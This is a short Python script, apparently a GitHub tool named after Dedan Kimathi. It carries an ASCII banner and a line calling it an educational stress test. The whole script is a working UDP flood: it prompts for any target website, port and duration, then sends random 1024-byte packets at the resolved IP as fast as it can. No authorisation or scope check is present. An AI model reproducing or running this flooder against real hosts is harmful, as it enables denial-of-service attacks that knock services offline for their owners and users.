import socket
import random
import sys
import os
import time
from time import sleep


print('''
  ________                                  .__           ____  __.__                __  .__    .__ 
 /  _____/  ____   ____   ________________  |  |         |    |/ _|__| _____ _____ _/  |_|  |__ |__|
/   \  ____/ __ \ /    \_/ __ \_  __ \__  \ |  |         |      < |  |/     \\__  \\   __\  |  \|  |
\    \_\  \  ___/|   |  \  ___/|  | \// __ \|  |__       |    |  \|  |  Y Y  \/ __ \|  | |   Y  \  |
 \______  /\___  >___|  /\___  >__|  (____  /____/       |____|__ \__|__|_|  (____  /__| |___|  /__|
        \/     \/     \/     \/           \/                     \/        \/     \/          \/    
                             https://github.com/Wizaad/kimathi
                               https://twitter.com/MrWizaad
''')
print('*' * 99)

description = "In memories of Dedan Kimathi, This tool is for educational purpose only! It a python based stress test"\
              "tool. \n "
for _ in description:
    sleep(0.1)
    sys.stdout.write(_)
    sys.stdout.flush()

sleep(3)
print("!" * 99)
byte = random._urandom(1024)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
os.system("clear")
target = input('Enter your target website: ')
ip = socket.gethostbyname(target)
port = int(input('Enter Port: '))
duration = int(input("Enter duration: "))
timeout = time.time() + duration
sent = 0

while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(byte, (ip, port))
        sent += 1
        print("Sent", sent, "packets to", ip, "through", port,)

    except KeyboardInterrupt:
        sys.exit()
print('End of testing...')
